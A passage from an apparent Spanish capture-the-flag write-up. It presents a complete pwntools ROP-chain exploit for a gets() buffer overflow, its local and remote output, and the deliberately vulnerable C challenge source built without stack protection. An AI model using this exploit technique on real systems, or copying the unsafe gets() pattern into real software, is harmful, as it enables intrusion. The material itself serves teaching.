¿Qué valor que sustraendo 1 de él es igual a 1? ¡Este lo dejaré encontrar solo!

Ahora que tenemos 3 argumentos, necesitaremos un `pop; pop; pop; ret;`, por lo que el exploit final es:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget
poppoppopret = pwn.p32(0x080494a1)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

flag = pwn.p32(0x80492fc)   # func3 address
f3arg1 = pwn.p32(??)        # 1st argument of func3

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + poppoppopret + 1st arg f2 + 2nd arg f2 + 3rd arg f2
+ func3 address + JUNK + 1st arg f3

"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + poppoppopret \
    + f2arg1 \
    + f2arg2 \
    + f2arg3 \
    + flag \
    + 'JUNK'.encode() \
    + f3arg1

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

La salida:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2370
=========================
what the process returned
[*] Process '/home/reisraff/workdir/challs/port-65144/port-65144' stopped with exit code 0 (pid 2370)
Enter your buffer: gotcha func1
gotcha func2
FLAG TEST
```

Ahora tenemos que ejecutarlo de forma remota, ya que el nombre del binario es port-65144, probemos este puerto:

```python
# ...
p = pwn.remote('173.230.139.237', '65144')
# ...
```

Salida:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2375
[+] Opening connection to 173.230.139.237 on port 65144: Done
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
reisraff{D47a_3xecu710n_Pr3ven71on_owned}

```

El código fuente de este desafío es:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/mman.h>

bool flag1 = false;
bool flag2 = false;

void func1(int num1, int num2) {
    if (156 == num1 && 300 == num2) {
        flag1 = true;
        puts("gotcha func1");
    }
}

void func2(int num1, int num2, int num3) {
    if (flag1 && !num1 && 13 == num2 && (num1 + num2) == num3) {
        flag2 = true;
        puts("gotcha func2");
    }
}

void flag(int num1) {
    int fd = open("/code/ROP-me/flag.txt", O_RDONLY);
    int len = lseek(fd, 0, SEEK_END);
    void *data = mmap(0, len, PROT_READ, MAP_PRIVATE, fd, 0);

    if (flag1 && flag2 && (num1 - flag1) == flag2) {
        printf("%s", data);
        exit(0);
    }
}

void vuln() {
    char buffer[160];

    printf("Enter your buffer: ");
    gets(buffer);
}

int main() {
    vuln();

    puts("not this time");

    return 1;
}

```

Y compilo así:

```bash
gcc -o program program.c -m32 -no-pie -w -fno-stack-protector

# Then I strip
strip program

# And then I set it up with socat to run in the por 65144
socat TCP4-LISTEN:65144,reuseaddr,fork EXEC:./program &
```
